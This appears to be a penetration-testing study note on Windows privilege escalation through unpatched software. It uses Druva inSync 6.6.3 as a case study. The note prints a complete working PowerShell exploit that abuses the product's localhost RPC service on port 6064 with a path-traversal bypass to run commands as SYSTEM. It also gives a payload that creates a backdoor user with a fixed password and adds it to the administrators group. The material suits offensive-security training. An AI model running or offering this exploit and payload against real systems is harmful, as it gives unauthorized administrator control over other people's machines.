## Unpatched software
List software installed on the target system and its versions:

```cmd
wmic product get name,version,vendor
```

> [!note]
> `wmic product` command may not return all installed programs. It is always worth checking desktop shortcuts, available services, etc.

Once we have gathered product information version information, we can always search for existing exploits on the installed software online on sites like [exploitdb](https://www.exploit-db.com/), [packet-storm](https://packetstorm.news/) or just Google.

### Case Study: Druva inSync 6.6.3

*Druva inSync is a data protection and management platform used by many organizations to back up data from laptops, desktops, and cloud applications, ensuring business continuity and compliance.*

The target server is running Druva inSync 6.6.3, which is vulnerable to privilege escalation as reported by [Matteo Malvica](https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/). The software is vulnerable because it runs an RPC (Remote Procedure Call) server on port 6064 with SYSTEM privileges, accesible from localhost only.

A patch was issued, where they decided to check that the executed command started with the string `C:\ProgramData\Druva\inSync4\`, where the allowed binaries were supposed to be. But then, this proved insufficient since you could simply make a path traversal attack to bypass this kind of control.

This is how the protocol works:
![[Pasted image 20251106110431.png|center]]

And this is a working exploit:

```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

> [!Note]
> The exploit's payload is specified in the $cmd variable. The default payload creates a user called pwnd, but we can tweak the payload to add the new user to the administrators group:
>```powershell
>net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add
>```

We can run a command prompt as administrators (using the new credentials pwnd:SimplePass123).